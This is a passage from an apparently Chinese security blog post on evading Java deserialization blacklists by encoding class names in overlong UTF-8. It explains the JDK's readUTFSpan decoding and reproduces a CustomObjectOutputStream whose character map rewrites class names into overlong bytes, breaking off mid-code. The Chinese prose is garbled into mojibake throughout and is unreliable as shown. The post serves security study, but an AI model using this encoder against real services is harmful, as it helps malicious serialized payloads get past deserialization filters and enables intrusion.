è¿™äº›ç±»åï¼Œè®©å…¶ä¸å¯è§ä»è€Œç»•è¿‡æ£€æµ‹</p><p>é‚£ç°åœ¨å°±å»çœ‹çœ‹javaååºåˆ—åŒ–æ—¶æ˜¯æ€ä¹ˆè¯»å–ç±»åï¼Œåˆ†æä¸ºä»€ä¹ˆæˆ‘ä»¬å¯ä»¥ç»•è¿‡</p><p>è¿™é‡Œå°è¯•è‡ªå·±è°ƒäº†ä¸€ä¸‹ï¼Œå‘ç°ä¸å¤ªå¥½è°ƒ(ä¸»è¦æ˜¯å¤ªèœäº†ğŸ¥²)ï¼Œ1ueå¸ˆå‚…çš„æ–‡ç« ç»™å‡ºäº†è°ƒç”¨æ ˆï¼Œå°±ä¸é‡å¤´è‡ªå·±è°ƒäº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ObjectStreamClass#readNonProxy(ObjectInputStream in)<br>ObjectInputStream#readUTF()<br>BlockDataInputStream#readUTF()<br>ObjectInputStream#readUTFBody(long utflen)<br>ObjectInputStream#readUTFSpan(StringBuilder sbuf, long utflen)<br></code></pre></td></tr></table></figure><p>ç›´æ¥æ–­åœ¨readNonProxyæ–¹æ³•çš„è°ƒç”¨å¤„</p><p><img src="https://cdn.clown2024.cn/202410202345526.png" alt="image-20241020234544465"></p><p>çœ‹ä¸€ä¸‹ideaçš„è°ƒç”¨æ ˆï¼Œå¤§æ¦‚çŸ¥é“ä¸€ä¸‹æ€ä¹ˆæ¥åˆ°è¿™é‡Œçš„</p><p><img src="https://cdn.clown2024.cn/202410202346567.png" alt="image-20241020234623530"></p><p>ç„¶åè·Ÿè¿›readNonProxyæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410202347133.png" alt="image-20241020234726090"></p><p>å¯ä»¥çœ‹åˆ°ç±»åçš„è¯»å–å°±æ˜¯ç”¨readUTFæ–¹æ³•</p><p>ç„¶åç›´æ¥èµ°åˆ°æ¯”è¾ƒå…³é”®çš„ObjectInputStream#readUTFBodyæ–¹æ³•é‡Œé¢</p><p><img src="https://cdn.clown2024.cn/202410202354104.png" alt="image-20241020235420062"></p><p>æœ€åçš„è¯»å–å®ç°é€»è¾‘å°±åœ¨è¿™ä¸¤ä¸ªæ–¹æ³•é‡Œé¢ï¼Œè¿™ä¸¤ä¸ªæ–¹æ³•é‡Œé¢è¯»å–å­—èŠ‚çš„å…³é”®é€»è¾‘æ˜¯ä¸€æ ·çš„ï¼Œçœ‹å…¶ä¸­ä¸€ä¸ªå³å¯</p><p>è¿™é‡Œçœ‹ä¸€ä¸‹readUTFSpanæ–¹æ³•çš„é€»è¾‘ï¼Œè¯¥æ–¹æ³•å°±æ˜¯æ ¹æ®utflenå»è·å–classnameçš„å€¼å¹¶è¿”å›åˆ°sbufä¸­</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">long</span> <span class="hljs-title function_">readUTFSpan</span><span class="hljs-params">(StringBuilder sbuf, <span class="hljs-type">long</span> utflen)</span><br>            <span class="hljs-keyword">throws</span> IOException<br>        &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">cpos</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> pos;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">avail</span> <span class="hljs-operator">=</span> Math.min(end - pos, CHAR_BUF_SIZE);<br>            <span class="hljs-comment">// stop short of last char unless all of utf bytes in buffer</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">stop</span> <span class="hljs-operator">=</span> pos + ((utflen &gt; avail) ? avail - <span class="hljs-number">2</span> : (<span class="hljs-type">int</span>) utflen);<br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">outOfBounds</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">while</span> (pos &lt; stop) &#123;<br>                    <span class="hljs-type">int</span> b1, b2, b3;<br>                    b1 = buf[pos++] &amp; <span class="hljs-number">0xFF</span>;<br>                    <span class="hljs-keyword">switch</span> (b1 &gt;&gt; <span class="hljs-number">4</span>) &#123;<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:   <span class="hljs-comment">// 1 byte format: 0xxxxxxx</span><br>                            cbuf[cpos++] = (<span class="hljs-type">char</span>) b1;<br>                            <span class="hljs-keyword">break</span>;<br><br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">12</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">13</span>:  <span class="hljs-comment">// 2 byte format: 110xxxxx 10xxxxxx</span><br>                            b2 = buf[pos++];<br>                            <span class="hljs-keyword">if</span> ((b2 &amp; <span class="hljs-number">0xC0</span>) != <span class="hljs-number">0x80</span>) &#123;<br>                                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTFDataFormatException</span>();<br>                            &#125;<br>                            cbuf[cpos++] = (<span class="hljs-type">char</span>) (((b1 &amp; <span class="hljs-number">0x1F</span>) &lt;&lt; <span class="hljs-number">6</span>) |<br>                                                   ((b2 &amp; <span class="hljs-number">0x3F</span>) &lt;&lt; <span class="hljs-number">0</span>));<br>                            <span class="hljs-keyword">break</span>;<br><br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">14</span>:  <span class="hljs-comment">// 3 byte format: 1110xxxx 10xxxxxx 10xxxxxx</span><br>                            b3 = buf[pos + <span class="hljs-number">1</span>];<br>                            b2 = buf[pos + <span class="hljs-number">0</span>];<br>                            pos += <span class="hljs-number">2</span>;<br>                            <span class="hljs-keyword">if</span> ((b2 &amp; <span class="hljs-number">0xC0</span>) != <span class="hljs-number">0x80</span> || (b3 &amp; <span class="hljs-number">0xC0</span>) != <span class="hljs-number">0x80</span>) &#123;<br>                                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTFDataFormatException</span>();<br>                            &#125;<br>                            cbuf[cpos++] = (<span class="hljs-type">char</span>) (((b1 &amp; <span class="hljs-number">0x0F</span>) &lt;&lt; <span class="hljs-number">12</span>) |<br>                                                   ((b2 &amp; <span class="hljs-number">0x3F</span>) &lt;&lt; <span class="hljs-number">6</span>) |<br>                                                   ((b3 &amp; <span class="hljs-number">0x3F</span>) &lt;&lt; <span class="hljs-number">0</span>));<br>                            <span class="hljs-keyword">break</span>;<br><br>                        <span class="hljs-keyword">default</span>:  <span class="hljs-comment">// 10xx xxxx, 1111 xxxx</span><br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTFDataFormatException</span>();<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (ArrayIndexOutOfBoundsException ex) &#123;<br>                outOfBounds = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-keyword">if</span> (outOfBounds || (pos - start) &gt; utflen) &#123;<br>                    <span class="hljs-comment">/*</span><br><span class="hljs-comment">                     * Fix for 4450867: if a malformed utf char causes the</span><br><span class="hljs-comment">                     * conversion loop to scan past the expected end of the utf</span><br><span class="hljs-comment">                     * string, only consume the expected number of utf bytes.</span><br><span class="hljs-comment">                     */</span><br>                    pos = start + (<span class="hljs-type">int</span>) utflen;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTFDataFormatException</span>();<br>                &#125;<br>            &#125;<br><br>            sbuf.append(cbuf, <span class="hljs-number">0</span>, cpos);<br>            <span class="hljs-keyword">return</span> pos - start;<br>        &#125;<br></code></pre></td></tr></table></figure><p>é‡Œé¢åˆ†åˆ«å¯¹1å­—èŠ‚ã€2å­—èŠ‚ã€3å­—èŠ‚çš„å½¢å¼è¿›è¡Œäº†å¤„ç†ï¼Œå¯¹å­—èŠ‚æ ¼å¼çš„åˆ¤æ–­æ˜¯é€šè¿‡b1çš„é«˜å››ä½æ¥ç¡®å®šçš„</p><p><strong>1å­—èŠ‚å¤„ç†ï¼š</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 1 byte format: 0xxxxxxx</span><br>cbuf[cpos++] = (<span class="hljs-type">char</span>) b1;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„å¤„ç†å¾ˆç®€å•ï¼Œç›´æ¥å°†b1å­—èŠ‚å€¼è½¬æ¢æˆå­—ç¬¦</p><p><strong>2å­—èŠ‚å¤„ç†ï¼š</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 2 byte format: 110xxxxx 10xxxxxx</span><br>b2 = buf[pos++];<br><span class="hljs-keyword">if</span> ((b2 &amp; <span class="hljs-number">0xC0</span>) != <span class="hljs-number">0x80</span>) &#123;<br>     <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTFDataFormatException</span>();<br>&#125;<br>cbuf[cpos++] = (<span class="hljs-type">char</span>) (((b1 &amp; <span class="hljs-number">0x1F</span>) &lt;&lt; <span class="hljs-number">6</span>) |<br>        ((b2 &amp; <span class="hljs-number">0x3F</span>) &lt;&lt; <span class="hljs-number">0</span>));<br></code></pre></td></tr></table></figure><p>æ£€æŸ¥ç¬¬äºŒä¸ªå­—èŠ‚æ˜¯å¦ç¬¦åˆæ ¼å¼ï¼Œç„¶ååˆå¹¶ä¸¤ä¸ªå­—èŠ‚ç”Ÿæˆå­—ç¬¦</p><p>é¦–å…ˆæ ¹æ®b1é«˜å››ä½ä¸º12æˆ–è€…13ï¼ŒçŸ¥é“b1çš„å‰å››ä½åªèƒ½ä¸º1100æˆ–1101ï¼Œä¹Ÿå°±æ˜¯å‰ä¸‰ä½å›ºå®šä¸º110ï¼›b2ä¸ä¸Š0xc0ä¸€å®šè¦ä¸º0x80ï¼Œæ‰€ä»¥b2å‰ä¸¤ä½ä¸€å®šä¸º10ï¼›</p><p>ç„¶ååœ¨è½¬æ¢å­—ç¬¦çš„æ—¶å€™ï¼Œç”±b1å­—èŠ‚çš„æœ€åä¸¤ä½å’Œb2çš„åå…­ä½æ„æˆå­—ç¬¦çš„å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯unicodeçš„ä»£ç ç‚¹ï¼Œæœ€åè¯»å–å‡ºæˆ‘ä»¬çš„å­—ç¬¦</p><p>b1&amp;0x1Fçš„ä½œç”¨å°±æ˜¯å»é™¤å‰ç¼€110ï¼ŒåŒæ ·çš„b2&amp;0x3Fçš„ä½œç”¨å°±æ˜¯å»é™¤å‰ç¼€10</p><blockquote><p>è¿™é‡Œæœ‰ä¸ªæ¯”è¾ƒé‡è¦çš„åœ°æ–¹ï¼Œå°±æ˜¯intç±»å‹çš„ç§»ä½</p><p>å› ä¸ºä¸€å¼€å§‹ä¹ æƒ¯æ€§çš„è®¤ä¸ºè¶…å‡º8ä½ä¼šè¢«æˆªæ–­ï¼Œåæ¥ä¸€æƒ³å¦‚æœåªæœ‰8ä½æ€ä¹ˆè¡¨ç¤ºunicodeå­—ç¬¦è¿™ä¹ˆå¤§çš„ä»£ç ç‚¹å‘¢</p><p>åæ¥å°±çŸ¥é“äº†intç±»å‹å› ä¸ºæ˜¯32ä½ï¼Œä»–æ˜¯æŒ‰ç…§32ä½æ¥ç§»ä½çš„ï¼Œæ‰€ä»¥ä¸Šé¢çš„ç§»ä½æ“ä½œå¹¶ä¸ä¼šå‘ç”Ÿæˆªæ–­ï¼Œä¹Ÿå°±æ˜¯æ¯”å¦‚ï¼š00010100å·¦ç§»äº”ä½æ˜¯10100 00000ï¼Œè¿™æ˜¯æŒ‰ç…§32ä½æ¥çš„ï¼Œè¿™æ ·ä¸Šé¢çš„åˆå¹¶æ“ä½œçœ‹èµ·æ¥å°±åˆç†äº†</p></blockquote><p>å¦‚æœæƒ³è¦ç”¨ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦æ¯”å¦‚oçš„è¯ï¼Œ<strong>oçš„äºŒè¿›åˆ¶ä¸º01101111</strong>ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®è¦æ±‚å°†å…¶æ‰©å……æˆä¸¤å­—èŠ‚UTF-8çš„ç¼–ç </p><p>æ ¹æ®ä¸Šé¢å¯çŸ¥ï¼Œb1ä¿ç•™äº†è‡ªå·±çš„ä¸­é—´3ä½ï¼Œå½¢å¼ä¸º 110+ä¸‰ä½+è¦åˆå¹¶çš„ä¸¤ä½ï¼Œb2å°±æ˜¯b1çš„åä¸¤ä½åŠ ä¸Šè‡ªå·±çš„å6ä½ï¼Œæ‰€ä»¥è¿™å…­ä½å¾ˆå®¹æ˜“çŸ¥é“æ˜¯å›ºå®šçš„ï¼Œb2çš„å‰ç¼€ä¸€å®šä¸º10ï¼Œæ‰€ä»¥b2å°±æ˜¯å›ºå®šçš„æ²¡åŠæ³•å˜åŒ–</p><p>ç„¶åæˆ‘ä»¬æƒ³è½¬å­—ç¬¦çš„è¯ï¼Œç”±äºå­—æ¯çš„Unicodeç¼–ç æ˜¯0-127ï¼Œæ‰€ä»¥ç¬¬ä¸€ä½å­—èŠ‚è‚¯å®šä¸º0ï¼Œå¦‚æœæˆ‘ä»¬è¦å¾—åˆ°è¿™ç§å½¢å¼ï¼Œé‚£ä¹ˆb1çš„ä¸­é—´3ä½ä¸€å®šå¾—ä¸º0ä¹Ÿæ˜¯å›ºå®šçš„ï¼Œåˆå¹¶çš„ä¸¤ä½å°±æ˜¯æˆ‘ä»¬oå­—ç¬¦çš„å‰ä¸¤ä½</p><p>æ‰€ä»¥oè½¬æ¢æˆèƒ½å¤Ÿè§£æçš„äºŒè¿›åˆ¶å½¢å¼å°±ä¸ºï¼š11000001 10101111ï¼Œå›ºå®šä¸º\xC1\xAF</p><p><strong>3å­—èŠ‚å¤„ç†ï¼š</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 3 byte format: 1110xxxx 10xxxxxx 10xxxxxx</span><br>b3 = buf[pos + <span class="hljs-number">1</span>];<br>b2 = buf[pos + <span class="hljs-number">0</span>];<br>pos += <span class="hljs-number">2</span>;<br><span class="hljs-keyword">if</span> ((b2 &amp; <span class="hljs-number">0xC0</span>) != <span class="hljs-number">0x80</span> || (b3 &amp; <span class="hljs-number">0xC0</span>) != <span class="hljs-number">0x80</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTFDataFormatException</span>();<br>&#125;<br>cbuf[cpos++] = (<span class="hljs-type">char</span>) (((b1 &amp; <span class="hljs-number">0x0F</span>) &lt;&lt; <span class="hljs-number">12</span>) |<br>         ((b2 &amp; <span class="hljs-number">0x3F</span>) &lt;&lt; <span class="hljs-number">6</span>) |<br>         ((b3 &amp; <span class="hljs-number">0x3F</span>) &lt;&lt; <span class="hljs-number">0</span>));<br></code></pre></td></tr></table></figure><p>åŒæ ·æ£€æŸ¥åä¸¤ä¸ªå­—èŠ‚ç„¶ååˆå¹¶ç”Ÿæˆå­—ç¬¦ï¼Œæœ‰å‰é¢åˆ†æ2å­—èŠ‚å¤„ç†çš„åŸºç¡€ï¼Œåˆ†æ3å­—èŠ‚çš„å¤„ç†ä¹Ÿå°±ç®€å•å¾ˆå¤šäº†</p><p>é¦–å…ˆb1å³ç§»4ä½ç­‰äº14ï¼Œå³å‰ç¼€ä¸€å®šæ˜¯1110ï¼Œç„¶åå°±æ˜¯åˆ¤æ–­b2ã€b3å‰ç¼€æ˜¯å¦ä¸º10</p><p>åˆå¹¶çš„é€»è¾‘å°±æ˜¯ï¼šb1å»é™¤å‰ç¼€å·¦ç§»12ä½ï¼Œb2å»é™¤å‰ç¼€å·¦ç§»6ä½ï¼Œb3å»é™¤å‰ç¼€ä¸ç§»ä½</p><p>ç„¶åå°±æ˜¯æƒ³è¦ä¸‰å­—èŠ‚åˆå¹¶ä¸ºä¸€ä¸ªasciiå­—ç¬¦æœ‰ä»€ä¹ˆè¦æ±‚äº†</p><ul><li>b1ï¼šä¸ºå‰ç¼€1110 + 0000ï¼Œå›ºå®šäº†</li><li>b3ï¼šæ²¡æœ‰ç§»ä½ä¹Ÿæ˜¯å›ºå®šçš„ï¼Œå°±æ˜¯10+æˆ‘ä»¬è¦è½¬åŒ–çš„å­—ç¬¦çš„åå…­ä½</li><li>b2ï¼š100000 + å­—ç¬¦å‰ä¸¤ä½</li></ul><p>ä¾‹å¦‚ç”¨b1ï¼Œb2ï¼Œb3è¡¨ç¤ºjå­—ç¬¦ï¼š11100000 10000001 10101010</p><h2 id="è½¬æ¢ä¸ºoverlong-encoding"><a href="#è½¬æ¢ä¸ºOverlong-Encoding" class="headerlink" title="è½¬æ¢ä¸ºOverlong Encoding"></a>è½¬æ¢ä¸ºOverlong Encoding</h2><p>é‚£ä¹ˆåº”è¯¥å¯¹ç±»è¿›è¡Œè½¬æ¢å‘¢ï¼Œæˆ‘ä»¬å¯ä»¥æƒ³åˆ°ç›´æ¥æš´åŠ›å°†æ‰€æœ‰åºåˆ—åŒ–å­—èŠ‚æµè¿›è¡Œæ›¿æ¢ï¼Œä½†ä¼šç ´åä¸€äº›éç±»åçš„ä¿¡æ¯ï¼Œå¯èƒ½å¯¼è‡´ååºåˆ—åŒ–å¤±è´¥ï¼Œ<a href="https://xz.aliyun.com/u/81008"><strong>lzstar</strong></a>å¸ˆå‚…çš„æ–‡ç« ä¸­ç»™å‡ºäº†æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥ç»§æ‰¿ObjectOutputStreamé‡å†™é‡Œé¢çš„åºåˆ—åŒ–é€»è¾‘ï¼Œæ›´å‡†ç¡®çš„è¯´ï¼Œæ˜¯é‡å†™åºåˆ—åŒ–ç±»åçš„æ–¹æ³•</p><p>å¸ˆå‚…çš„é‡å†™æ€è·¯å°±æ˜¯ç»§æ‰¿ObjectOutputStreamï¼Œé‡å†™writeClassDescriptoræ–¹æ³•ï¼Œåœ¨writeClassDescriptoræ–¹æ³•ä¸­å®ç°desc.writeNonProxy(this)æ–¹æ³•çš„é€»è¾‘å’Œå°†ç±»åOverlong Encodingçš„é€»è¾‘ï¼Œå…·ä½“æ“ä½œçš„è¯å°±æ˜¯ç›´æ¥å°†desc.writeNonProxy(this)æ–¹æ³•çš„é€»è¾‘å¤åˆ¶è¿›å»ï¼Œç¼ºå°‘çš„å±æ€§å¯ä»¥é€šè¿‡åå°„è·å–ï¼Œç¼ºå°‘çš„æ–¹æ³•å¯ä»¥é€šè¿‡åå°„è°ƒç”¨ï¼Œä¹‹ååœ¨é‡Œé¢åŠ ä¸ŠOverlong Encodingçš„é€»è¾‘å°±å¯ä»¥äº†ã€‚</p><p>ç›´æ¥è´´å¸ˆå‚…çš„ä»£ç äº†è¿™é‡Œï¼Œè†œæ‹œä½¬orz</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * å‚è€ƒpç¥ï¼šhttps://mp.weixin.qq.com/s/fcuKNfLXiFxWrIYQPq7OCg</span><br><span class="hljs-comment"> * å‚è€ƒ1ueï¼šhttps://t.zsxq.com/17LkqCzk8</span><br><span class="hljs-comment"> * å®ç°ï¼šå‚è€ƒ OObjectOutputStream# protected void writeClassDescriptor(ObjectStreamClass desc)æ–¹æ³•</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomObjectOutputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectOutputStream</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">CustomObjectOutputStream</span><span class="hljs-params">(OutputStream out)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">super</span>(out);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> HashMap&lt;Character, <span class="hljs-type">int</span>[]&gt; map;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Map&lt;Character,<span class="hljs-type">int</span>[]&gt; bytesMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xae</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xbb</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xa4</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9b</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9d</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa1</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa2</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa3</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa4</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa5</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa6</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa7</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa8</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa9</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaa</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xab</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xac</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xad</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xae</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaf</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb0</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb1</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb2</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb3</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb4</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb5</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb6</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb7</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb8</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb9</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xba</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x81</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x82</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x83</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x84</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x85</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x86</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x87</span>&#125;);<br>        map.put(<span 